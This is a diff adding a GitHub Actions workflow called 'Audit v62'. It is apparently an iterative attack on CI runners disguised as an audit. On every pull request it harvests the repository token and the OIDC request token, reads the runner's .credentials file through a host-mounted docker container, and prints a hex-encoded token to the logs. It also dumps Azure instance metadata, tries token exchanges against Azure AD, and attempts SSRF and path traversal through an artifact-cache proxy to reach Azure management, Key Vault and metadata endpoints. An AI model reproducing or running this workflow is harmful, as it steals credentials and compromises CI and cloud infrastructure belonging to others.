@@ -1,0 +1,253 @@
+name: Audit v62
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v62:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V62 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: RAW IMDS DUMP + SUBSCRIPTION EXTRACTION
+      # V61 IMDS was silent — python3 -m json.tool likely errored.
+      # Use raw dump now. Extract sub/rg/vm IDs.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - IMDS Raw Dump
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== IMDS RAW ==="
+          IMDS="http://169.254.169.254"
+          API="api-version=2021-02-01"
+
+          echo "--- A: compute raw ---"
+          COMPUTE=$(/usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/instance/compute?$API" 2>/dev/null)
+          echo "$COMPUTE"
+          echo ""
+
+          # Extract key fields
+          SUB=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('subscriptionId',''))" 2>/dev/null)
+          RG=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('resourceGroupName',''))" 2>/dev/null)
+          VMNAME=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('name',''))" 2>/dev/null)
+          VMID=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('vmId',''))" 2>/dev/null)
+          VMSIZE=$(echo "$COMPUTE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('vmSize',''))" 2>/dev/null)
+          echo ""
+          echo "EXTRACTED: SUB=$SUB RG=$RG VM=$VMNAME VMID=$VMID SIZE=$VMSIZE"
+          echo "$SUB" > /tmp/sub.txt; echo "$RG" > /tmp/rg.txt
+          echo "$VMNAME" > /tmp/vmname.txt; echo "$VMID" > /tmp/vmid.txt
+
+          echo ""
+          echo "--- B: network raw ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/instance/network?$API" 2>/dev/null
+          echo ""
+
+          echo "--- C: loadbalancer raw ---"
+          /usr/bin/curl -sS -m 5 -H "Metadata: true" "$IMDS/metadata/loadbalancer?$API" 2>/dev/null | head -c 1500
+          echo ""
+
+          echo "--- D: identity/oauth2/token with object_id ---"
+          # Try managed identity endpoints by object ID (DDDDDDDD pattern seen in errors)
+          for OBJ in "" "DDDDDDDD-DDDD-DDDD-DDDD-DDDDDDDDDDDD" "00000000-0000-0000-0000-000000000000"; do
+            if [ -z "$OBJ" ]; then
+              PARAM=""
+            else
+              PARAM="&object_id=$OBJ"
+            fi
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -m 5 \
+              -H "Metadata: true" \
+              "$IMDS/metadata/identity/oauth2/token?$API&resource=https%3A%2F%2Fmanagement.azure.com%2F$PARAM" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "D object_id=$OBJ = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: AZURE AD TOKEN EXCHANGE FIX
+      # V61: AADSTS900144 — missing requested_token_use=on_behalf_of
+      # Add it now and try multiple grant types.
+      # Also try client_credentials with OIDC as client_assertion.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Azure AD OBO Fix + Federated Credential
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== AZURE AD TOKEN FIX ==="
+          IDTOK_URL=$(cat /tmp/idtok_url.txt 2>/dev/null || echo "$ACTIONS_ID_TOKEN_REQUEST_URL")
+          IDTOK_REQ=$(cat /tmp/idtok.txt)
+
+          # Fetch OIDC token for management.azure.com audience
+          OIDC_MGMT=$(/usr/bin/curl -sS -m 5 \
+            -H "Authorization: Bearer $IDTOK_REQ" \
+            "${IDTOK_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
+            python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
+          echo "OIDC_LEN=${#OIDC_MGMT}"
+
+          # A: Fix — add requested_token_use=on_behalf_of
+          echo "--- A: OBO fix with on_behalf_of ---"
+          for TENANT in "common" "organizations" "consumers"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST -m 5 \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$OIDC_MGMT&requested_token_use=on_behalf_of&scope=https://management.azure.com/.default" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A TENANT=$TENANT OBO = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # B: Client credentials with OIDC as client_assertion (federated credential)
+          # Try common known app IDs that may have GitHub Actions federated creds
+          echo "--- B: Federated credential client_credentials ---"
+          for CLIENT_ID in \
+            "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" \
+            "04b07795-8542-4f8a-96e0-8e1c9e9b31e2" \
+            "1950a258-227b-4e31-a9cf-717495945fc2" \
+            "00000003-0000-0000-c000-000000000000"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST -m 5 \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
+              -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=$OIDC_MGMT&scope=https://management.azure.com/.default" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B CLIENT=$CLIENT_ID = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: SSRF via ARTIFACTCACHE PROXY TO AZURE SERVICES
+      # Use the confirmed proxy (artifactcache + Host spoof) to reach
+      # Azure management endpoints from inside GitHub's trusted network.
+      # Combine with path traversal and auth header injection.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - SSRF to Azure Management via Proxy
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SSRF TO AZURE VIA PROXY ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          IDTOK_REQ=$(cat /tmp/idtok.txt)
+          IDTOK_URL=$(cat /tmp/idtok_url.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          SUB=$(cat /tmp/sub.txt 2>/dev/null | head -1)
+
+          OIDC=$(/usr/bin/curl -sS -m 5 \
+            -H "Authorization: Bearer $IDTOK_REQ" \
+            "${IDTOK_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
+            python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
+
+          # A: Route to management.azure.com via proxy
+          echo "--- A: ARM via proxy Host spoof ---"
+          for ARM_EP in \
+            "subscriptions" \
+            "subscriptions/$SUB/resourceGroups" \
+            "providers/Microsoft.Compute/virtualMachines"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $OIDC" \
+              -H "Host: management.azure.com" \
+              "$PROXY/$ARM_EP?api-version=2023-07-01" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A ARM $ARM_EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # B: Route to vault.azure.net via proxy
+          echo "--- B: KeyVault via proxy ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $OIDC" \
+            -H "Host: vault.azure.net" \
+            "$PROXY/secrets?api-version=7.4" --path-as-is 2>/dev/null)
+          CODE=$(echo "$R" | tail -1)
+          echo "B vault.azure.net = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          echo ""
+
+          # C: Path traversal on proxy targeting IMDS
+          echo "--- C: Traversal to IMDS via proxy ---"
+          for TRAV in \
+            "..%2f..%2f169.254.169.254%2fmetadata%2finstance" \
+            "%2f%2f169.254.169.254%2fmetadata%2finstance" \
+            "..%2fmetadata%2finstance" \
+            "metadata%2finstance"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Metadata: true" \
+              "$PROXY/$TRAV?api-version=2021-02-01" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C TRAV=$TRAV = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # D: Try vstoken service with OIDC token
+          echo "--- D: vstoken with OIDC ---"
+          for VSHOST in "vstoken.actions.githubusercontent.com" "vssps.dev.azure.com"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $OIDC" \
+              -H "Host: $VSHOST" \
+              "$PROXY/_apis/connectionData" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "D $VSHOST = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          done
+
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V62 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V62 COMPLETE ==="
